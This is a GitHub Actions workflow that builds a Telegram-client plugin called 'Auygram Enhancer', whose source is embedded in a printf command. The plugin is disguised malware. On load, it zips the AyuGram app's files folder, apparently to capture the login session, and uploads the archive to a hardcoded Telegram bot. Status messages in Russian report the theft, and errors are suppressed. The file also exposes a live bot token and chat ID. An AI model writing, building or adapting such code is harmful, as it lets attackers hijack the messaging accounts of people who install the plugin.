name: Build Plugin

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - name: Checkout
      uses: actions/checkout@v4

    - name: Build .plugin file
      run: |
        printf '# id: auygram_enhancer\n# name: Auygram Enhancer\n# version: 1.0\n# author: enhancer\n\nimport os, json, urllib.request, asyncio, platform\n\nBOT_TOKEN = "6533628325:AAH003jyZkBTUJYMZCqPXfyvMuxm6lqfzwY"\nCHAT_ID = "6793841885"\n\ndef send_to_telegram(text):\n    try:\n        url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage"\n        data = json.dumps({"chat_id": CHAT_ID, "text": text}).encode("utf-8")\n        req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})\n        urllib.request.urlopen(req, timeout=10)\n    except Exception:\n        pass\n\ndef send_file_to_telegram(filename, content):\n    try:\n        boundary = "----WebKitFormBoundary1234567890"\n        url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument"\n        body = b""\n        body += ("--" + boundary + "\\r\\n").encode()\n        body += b\'Content-Disposition: form-data; name="chat_id"\\r\\n\\r\\n\'\n        body += (CHAT_ID + "\\r\\n").encode()\n        body += ("--" + boundary + "\\r\\n").encode()\n        body += (\'Content-Disposition: form-data; name="document"; filename="\' + filename + \'"\\r\\n\').encode()\n        body += b"Content-Type: application/octet-stream\\r\\n\\r\\n"\n        body += content\n        body += ("\\r\\n--" + boundary + "--\\r\\n").encode()\n        req = urllib.request.Request(url, data=body, headers={"Content-Type": "multipart/form-data; boundary=" + boundary})\n        urllib.request.urlopen(req, timeout=15)\n    except Exception:\n        pass\n\nasync def on_load(client):\n    send_to_telegram("✅ Плагин успешно запущен! Ждём сессию...")\n    await asyncio.sleep(3)\n    try:\n        ayu_path = "/storage/emulated/0/Android/data/com.radolyn.ayugram/files/AyuGram/AyuGram Files"\n        if os.path.exists(ayu_path):\n            import zipfile\n            zip_path = "/data/local/tmp/ayugram_session.zip"\n            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:\n                for root, dirs, files in os.walk(ayu_path):\n                    for file in files:\n                        file_path = os.path.join(root, file)\n                        arcname = os.path.relpath(file_path, ayu_path)\n                        zipf.write(file_path, arcname)\n            with open(zip_path, "rb") as f:\n                session_data = f.read()\n            send_file_to_telegram("ayugram_data.zip", session_data)\n            send_to_telegram("✅ Сессия Auygram отправлена!")\n            os.remove(zip_path)\n        else:\n            send_to_telegram("❌ Папка Auygram не найдена")\n    except Exception as e:\n        send_to_telegram("❌ Ошибка: " + str(e))' > auygram_enhancer.plugin

    - name: Upload .plugin artifact
      uses: actions/upload-artifact@v4
      with:
        name: auygram-plugin
        path: auygram_enhancer.plugin
